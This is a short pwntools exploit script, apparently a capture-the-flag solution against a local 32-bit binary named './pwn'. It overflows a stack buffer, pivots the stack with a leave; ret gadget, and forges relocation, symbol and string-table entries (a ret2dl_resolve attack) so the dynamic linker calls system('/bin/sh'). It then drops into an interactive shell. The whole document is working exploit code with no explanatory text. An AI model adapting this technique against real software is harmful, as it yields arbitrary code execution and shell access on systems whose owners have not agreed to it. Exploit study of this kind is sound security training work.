from pwn import *
name = "./pwn"
elf = ELF(name)
p = process(name)
start = 0x804ae00
leave_ret_addr = 0x0804852b
payload1 = b"a"*40 + p32(start-20) + p32(elf.plt['read']) + p32(leave_ret_addr) + p32(0) + p32(start-20) + p32(0x100)
p.sendline(payload1)
rel_plt_addr = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym_addr = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr_addr = elf.get_section_by_name('.dynstr').header.sh_addr
fake_rel_plt_addr = start
current_addr = fake_rel_plt_addr + 0x8
align_addr = (0x10 - ((current_addr - dynsym_addr)%0x10))%0x10
fake_dynsym_addr = current_addr + align_addr
fake_dynstr_addr = fake_dynsym_addr + 0x10
bin_sh_addr = fake_dynstr_addr + 0x7
reloc_index = fake_rel_plt_addr - rel_plt_addr
st_name = fake_dynstr_addr - dynstr_addr
r_info = (int((fake_dynsym_addr -dynsym_addr)//0x10)<<8) + 0x7
fake_rel_plt = p32(elf.got['read']) + p32(r_info)
fake_dynsym = p32(st_name) + p32(0) + p32(0) + p32(0x12000000)
fake_dynstr = b"system\x00/bin/sh\x00\x00"
resolve_plt = 0x8048380
payload2 = p32(0x0) + p32(resolve_plt) + p32(reloc_index) + b"XXXX" + p32(bin_sh_addr) + fake_rel_plt + b"a"*align_addr + fake_dynsym + fake_dynstr
p.sendline(payload2)
p.interactive()
